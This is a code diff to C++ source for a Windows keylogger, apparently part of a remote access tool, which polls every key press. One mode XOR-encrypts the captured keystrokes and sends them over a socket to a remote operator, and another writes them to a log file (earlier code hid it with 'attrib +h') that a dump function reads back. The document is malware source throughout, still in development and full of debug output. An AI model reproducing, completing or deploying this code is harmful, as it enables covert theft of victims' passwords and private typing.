@@ -1,7 +1,7 @@
 
 #include "../inc/Keylogger.h"
 #include "../inc/other.h"
-
+#include "../inc/ErrorCodes.h"
 
 Keylogger::Keylogger()
 {
@@ -25,6 +25,24 @@ VOID Keylogger::setSocket(SOCKET &sock)
 }
 
 
+VOID Keylogger::setPathLogFile()
+{
+
+    WCHAR buff[MAX_PATH]={0};
+
+    if(GetFullPathNameW(a_log_file, sizeof(a_log_file), buff, NULL) == 0)
+    {
+        //if error;
+        a_path_log_file = a_log_file;
+    }
+    else
+    {
+        a_path_log_file = buff;
+    }
+    wcout << "Final path: " << a_path_log_file << endl;
+}
+
+
 wstring Keylogger::specialKey(INT &keystroke)
 {
     switch(keystroke)
@@ -37,7 +55,7 @@ wstring Keylogger::specialKey(INT &keystroke)
         return L"[SHIFT]";
                                                     
     case VK_RETURN:
-        //return L"[ENTER]";
+        wcout << "reuturn vk" << endl;
         return L"\n";
     case VK_BACK:
         return L"[BACKSPACE]";
@@ -211,35 +229,47 @@ VOID Keylogger::directSendKeystroke() //for directTcp
     INT status=0;
 
     wcout <<"in directSendKeystroke"  << endl;
-    while (directSendKeystrokeRunning)
+
+    HANDLE hFile = silenciousCreateFile(NULL);
+    if(hFile == NULL)
     {
-        Sleep(20);
-    
-        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
+        wcout << "\n\nfatal error in direcsendKeystroke !\n\n" << endl;
+    }
+    else
+    {
+
+        while (directSendKeystrokeRunning)
         {
-            if(GetAsyncKeyState(keystroke) == -32767)
+            Sleep(20);
+        
+            for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
             {
-                wcout << keystroke << endl;
-                if((keystroke>=39)&&(keystroke<91))
+                if(GetAsyncKeyState(keystroke) == -32767)
                 {
-                    //not SpecialKey
-                    unicode_char = intToUnicode(keystroke);
+                    wcout << keystroke << endl;
+                    if((keystroke>=39)&&(keystroke<91))
+                    {
+                        //not SpecialKey
+                        unicode_char = intToUnicode(keystroke);
+                    }
+                    else
+                    {
+                        unicode_char = specialKey(keystroke);
+                    }
+                    wcout << unicode_char << endl;
+                    wcout << directSendKeystrokeRunning << endl;
+                    status = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
+                    if(status == SOCKET_ERROR)
+                    {
+                        wcout << "\nerror in socket ...\n" << endl;
+                        wcout << GetLastError() << endl;
+                        directSendKeystrokeRunning = FALSE;
+                        CloseHandle(hFile);
+                    } 
                 }
-                else
-                {
-                    unicode_char = specialKey(keystroke);
-                }
-                wcout << unicode_char << endl;
-                wcout << directSendKeystrokeRunning << endl;
-                status = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
-                if(status == SOCKET_ERROR)
-                {
-                    wcout << "\nerror in socket ...\n" << endl;
-                    wcout << GetLastError() << endl;
-                    directSendKeystrokeRunning = FALSE;
-                } 
             }
         }
+    
     }
     wcout << "stop while directSendKeystrokeRunning" << endl;
 }
@@ -255,7 +285,6 @@ DWORD WINAPI Keylogger::recvDataThread(LPVOID param)
 
 VOID Keylogger::directRecvData()//waits to receive an end-of-connection message  for directTcp | for directTcp
 {
-
     WCHAR buff[512]={0};
     INT status;
     while(TRUE)
@@ -266,7 +295,7 @@ VOID Keylogger::directRecvData()//waits to receive an end-of-connection message 
             wcout << "SOCKET_ERROR" << endl;
             break;
         }
-        else if (XOREncryption( (wstring) buff) == L"\r\n")
+        else if (XOREncryption((wstring) buff) == L"\r\n")
         {
             break;
         }
@@ -280,12 +309,13 @@ VOID Keylogger::directRecvData()//waits to receive an end-of-connection message 
 
 //-------------------------------------------------------------------------------------------------------------------
 
+
 INT Keylogger::silenciousStop()//return 1 if error
 {
     /*returns 0 if the method is well executed.
     returns 1 if the silencious thread is not started. 
     */
-   if(silenciousBackgroundRunning)
+   if(!silenciousBackgroundRunning)
    {
         //silencious thread is not started. 
         return 1;   
@@ -300,7 +330,7 @@ INT Keylogger::silenciousStart()//return 1 if error
 {
     /*
     Algo:
-    1- (silenciousCreateFileAndHideFile)
+    1- (silenciousCreateFile)
         1.1- Test if exist.
         1.2- Set handle of the a_file_name.
         1.3- Hide a_file_name.
@@ -308,101 +338,118 @@ INT Keylogger::silenciousStart()//return 1 if error
         2.1- (silenciousKeyboardListeningAndWriteFile)
             2.1.1- (silenciousWriteKeystrokeInFile)
     */
-   if(silenciousCreateFileAndHideFile())
-   {
-       //if error
-        return 1;
-   }
+
+       //if error. If the file does not exist 
+    DWORD status_error_codes;
+    if(silenciousCreateFile(&status_error_codes) == NULL)
+    {
+        wcout << "Fata; error in silencipiStart" << endl;
+        wcout << "status_error_codes:" << status_error_codes << endl;
+        if(status_error_codes == ERROR_ACCESS_DENIED)
+        {
+            wcout << "error access denied baby !!" << endl;
+        }
+        return 1; // Fatal error
+    }
+    else //To delete
+    {
+        wcout << "file create insilenciousStart... ";
+    }
+
     HANDLE hThread  = CreateThread(NULL,0 ,silenciousThread ,this ,0 ,NULL);
     //WaitForSingleObject(hThread, INFINITE); //just for test
     return 0;
 }
 
 
+INT Keylogger::silenciousDelete()
+{
+
+   return 0;
+}
+
+
 DWORD WINAPI Keylogger::silenciousThread(LPVOID param) //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
 {
     Keylogger* This = (Keylogger *) param;
-
-    wcout << "Handler in staticThreadStart: " << This->a_hFile << endl;
-    This->silenciousKeyboardListeningAndWriteFile(This->a_hFile);
+    This->silenciousKeyboardListeningAndWriteFile();
 
     return 0;
 }
 
 
-VOID Keylogger::silenciousKeyboardListeningAndWriteFile(CONST HANDLE &hFile)
+VOID Keylogger::silenciousKeyboardListeningAndWriteFile()
 {
-    wcout << "Handle keyboardListeningAndWriteFile: " <<hFile << endl;
+    HANDLE hFile = silenciousCreateFile(NULL);
+
     wstring unicode_char;
     silenciousBackgroundRunning = TRUE;
-    while(silenciousBackgroundRunning)
-    {  
-        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
-        {
-            if(GetAsyncKeyState(keystroke) == -32767)
+    if(hFile != NULL)
+    {
+        while(silenciousBackgroundRunning)
+        {  
+            for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
             {
-                //if press key
-                cout << keystroke << endl;
-                if((keystroke>=39)&&(keystroke<91))
+                if(GetAsyncKeyState(keystroke) == -32767)
                 {
-                    //not SpecialKey
-                    unicode_char = intToUnicode(keystroke);
+                    //if press key
+                    cout << keystroke << endl;
+                    if((keystroke>=39)&&(keystroke<91))
+                    {
+                        //not SpecialKey
+                        unicode_char = intToUnicode(keystroke);
+                    }
+                    else
+                    {
+                        unicode_char = specialKey(keystroke);
+                    }
+                    //wcout << "char: "<<unicode_char << endl;
+                    silenciousWriteKeystrokeInFile(unicode_char, hFile);
                 }
-                else
-                {
-                    unicode_char = specialKey(keystroke);
-                }
-                wcout << "char: "<<unicode_char << endl;
-
-                silenciousWriteKeystrokeInFile(XOREncryption(unicode_char), hFile);
-                //silenciousWriteKeystrokeInFile(unicode_char, hFile);
             }
         }
     }
 }
 
 
-INT Keylogger::silenciousCreateFileAndHideFile() //return 1 if error
-{
-    HANDLE hFile; //use in CreateFile and WriteFile
-    BOOL status; // use in WriteFile
-    DWORD dwBytesWritten = 0; // use in WriteFile
+HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if error  
+{   
+    HANDLE hFile;
+    BOOL status; 
+    DWORD dwBytesWritten = 0; 
     DWORD dwDesiredAccess;
-    DWORD dwCreationDisposition; //use in CreateFilW
-   
-    if(checkIfFileExist((wstring)a_file_name))
+    DWORD dwCreationDisposition; 
+    
+    if(checkIfFileExist((wstring)a_log_file))
     {
         //if exist
         wcout << "[+] file exist.\n" << endl;
-        dwDesiredAccess = FILE_APPEND_DATA; // Automatically seek to the end of the file after creating/opening
         dwCreationDisposition = OPEN_ALWAYS; // Opens a file, always.
     }
     else
     {
         //file not exist
         wcout << "[-] File not  exist" << endl;
-        dwDesiredAccess = GENERIC_WRITE;
         dwCreationDisposition = CREATE_NEW;
     }
 
-    hFile = CreateFileW(a_file_name,  dwDesiredAccess,  0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
+
+    hFile = CreateFileW(a_log_file,  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
     wcout << "last error createfile: " << GetLastError() << endl;
     wcout << "CreateFile hFile: " << hFile << endl; 
+    
     if(hFile == INVALID_HANDLE_VALUE)
     {
         //fatal error
-        wcout << "FATAL ERROR in createHideFileAndHideFile" << endl;
-        return 1;
+        wcout << "FATAL ERROR in createHideFileAndHideFile: "<< GetLastError() << endl;
+        if(ERROR_CODES != NULL){*ERROR_CODES = GetLastError();}
+        return NULL;
     }
+    
     else
     {
-        wstring cmd = L"attrib +h " + (wstring)a_file_name; 
-        wcout << "cmd: " << cmd << endl;
-        _wsystem(cmd.c_str());
-        wcout << "[?] File hide !!!" << endl;
-        
-        a_hFile = hFile; //set attribut
-        return 0;
+        if(ERROR_CODES != NULL){*ERROR_CODES = RATEL_ERROR_SUCCESS;}
+        return hFile;
     }
 }
 
@@ -421,34 +468,56 @@ VOID Keylogger::silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST H
 
 vector <string> Keylogger::dumpAllData()
 {
-    CHAR chBuff[4096];
-    vector<string> result;
-    DWORD NumberOfBytesRead;
+    wcout <<"\n\n\n" << endl;
+    //returns all the data from the keylogger write file.
+    //If the Handle is not of efinite size then checkIfFileExist is called.
+    
+    if(!checkIfFileExist(a_log_file))
+    //If checkIfFileExist fails then the silent functionCreateFileAndHideFile is called.
+    {
+       return vector<string>(); // retourn vector empty if error
+    }
+
+    HANDLE hFile = silenciousCreateFile(NULL);
+
+    if(hFile == NULL)
+    {   //if it is impossible to return the handle
+        wcout << "if it is impossible to create the log file" << endl;
+        return vector<string>(); // retourn vector empty if error
+    }
+    
+    vector <string> result;
+    char chBuff[50]={0};
+    DWORD dwRead;
+
+    wcout << GetLastError() << endl;
 
     while(TRUE) //Read buffer of anonymous pipe and append the result in result_of_command
     {
-        if(!ReadFile(a_hFile, &chBuff, sizeof(chBuff) ,&NumberOfBytesRead,NULL))
+        if(!ReadFile(hFile, &chBuff, sizeof(chBuff) ,&dwRead,NULL))
         {
-            wcout << "stoppp" << endl;
+            wcout << " readFromPipe Error in read pipe childen out" << endl;
             break;
         }
-        wcout << chBuff << endl;// WARNING !!!!!!!!!!!!!!!
-        //Sleep(20);
-        result.push_back((string)chBuff);
-        ZeroMemory(&chBuff, strlen(chBuff));
+        if(dwRead == 0)
+        {
+            break;
+        }
+        //wcout << "dwRead: " << dwRead << endl;
+        //wcout <<"2: "<< ConvertUtf8ToWide((string) chBuff) << endl;
+        Sleep(20);
+       // wcout << GetLastError() << endl;
+       // wcout << "I: " << i << endl;
+        result.push_back((string) chBuff);
     }
+
+    CloseHandle(hFile);
     return result;
 }
 
 //-------------------------------------------------------------------------------------------------------------------
-HANDLE Keylogger::gethFile()
-{
-    return a_hFile;
-}
-
-
 Keylogger::~Keylogger()
-{wcout << "\n\nDestructorrrrrr\n\n" << endl;}
-
-
+{
+    ;
+}
 //----------------------------------------------------------------------------------
